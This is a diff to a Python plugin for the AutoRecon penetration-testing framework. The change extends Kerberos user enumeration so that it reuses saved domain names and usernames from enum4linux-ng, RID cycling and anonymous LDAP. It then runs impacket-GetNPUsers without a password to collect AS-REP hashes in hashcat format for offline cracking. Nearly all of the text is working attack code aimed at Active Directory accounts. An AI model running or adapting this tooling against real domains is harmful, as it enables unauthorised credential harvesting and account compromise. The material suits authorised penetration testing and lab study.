@@ -10,7 +10,8 @@ import os, re
 # Overlap with stock: nmap-kerberos runs krb5-enum-users only when --global.domain is given and
 # with a short built-in list. This plugin adds: domain auto-detection, a large wordlist, --safe,
 # a reusable valid-user list, and an AS-REP check (impacket-GetNPUsers -no-pass, one request
-# per confirmed user, no password) - stock AutoRecon has no AS-REP check.
+# per known user: kerbrute hits plus names already saved by RID cycling / anonymous LDAP; no password)
+# - stock AutoRecon has no AS-REP check. Domain is read from saved enum4linux-ng / LDAP output first.
 # Output: *_kerbrute_userenum.txt, kerberos_valid_users.txt (one name per line),
 #         kerberos_asrep_hashes.txt (hashcat mode 18200) when an account has no pre-auth.
 
@@ -38,6 +39,27 @@ def valid_users(text):
 def asrep_hashes(text):
 	return list(dict.fromkeys(re.findall(r'(\$krb5asrep\$\S+)', text)))
 
+def domain_from_saved(scandir):
+	# Domain already recorded by stock enum4linux-ng or the ldap-anonymous plugin: no extra traffic.
+	import glob
+	for f in glob.glob(os.path.join(scandir, '**', 'enum4linux-ng.txt'), recursive=True):
+		m = re.search(r'^\s*DNS domain:\s*([A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*$', open(f, errors='replace').read(), re.M)
+		if m:
+			return m.group(1)
+	for f in glob.glob(os.path.join(scandir, '**', '*ldap_naming_context.txt'), recursive=True):
+		d = domain_from_rootdse(open(f, errors='replace').read().splitlines())
+		if d:
+			return d
+	return None
+
+def known_names(scandir):
+	import glob
+	names = []
+	for pat in ('smb_rid_users.txt', 'ldap_anonymous_usernames.txt'):
+		for f in glob.glob(os.path.join(scandir, '**', pat), recursive=True):
+			names += [l.strip() for l in open(f, errors='replace') if re.fullmatch(r'[A-Za-z0-9._-]{1,64}', l.strip())]
+	return names
+
 class KerberosUserEnum(ServiceScan):
 
 	def __init__(self):
@@ -64,7 +86,7 @@ class KerberosUserEnum(ServiceScan):
 
 	async def run(self, service):
 		target = service.target
-		domain = self.get_global('domain', default=None)
+		domain = self.get_global('domain', default=None) or domain_from_saved(target.scandir)
 		if not domain:
 			_, out, _ = await service.execute('ldapsearch -x -o nettimeout=8 -H ldap://{address}:389 -s base -b "" defaultNamingContext 2>&1', outfile='{protocol}_{port}_kerberos_domain_rootdse.txt')
 			domain = domain_from_rootdse(await out.readlines())
@@ -84,8 +106,11 @@ class KerberosUserEnum(ServiceScan):
 			fh.write('\n'.join(users) + ('\n' if users else ''))
 		hashes = []
 		npu = which('impacket-GetNPUsers') or which('GetNPUsers.py')
-		if users and npu:
-			_, out, _ = await service.execute(os.path.basename(npu) + ' ' + domain + '/ -dc-ip {address} -no-pass -format hashcat -usersfile "' + os.path.join(scandir, 'kerberos_valid_users.txt') + '" 2>&1', outfile='{protocol}_{port}_kerberos_asrep_check.txt')
+		cands = list(dict.fromkeys(users + known_names(target.scandir)))   # + names from RID cycling / anonymous LDAP, if already saved
+		if cands and npu:
+			with open(os.path.join(scandir, 'kerberos_asrep_candidates.txt'), 'w') as fh:
+				fh.write('\n'.join(cands) + '\n')
+			_, out, _ = await service.execute(os.path.basename(npu) + ' ' + domain + '/ -dc-ip {address} -no-pass -format hashcat -usersfile "' + os.path.join(scandir, 'kerberos_asrep_candidates.txt') + '" 2>&1', outfile='{protocol}_{port}_kerberos_asrep_check.txt')
 			hashes = asrep_hashes('\n'.join(await out.readlines()))
 		if hashes:
 			with open(os.path.join(scandir, 'kerberos_asrep_hashes.txt'), 'w') as fh:
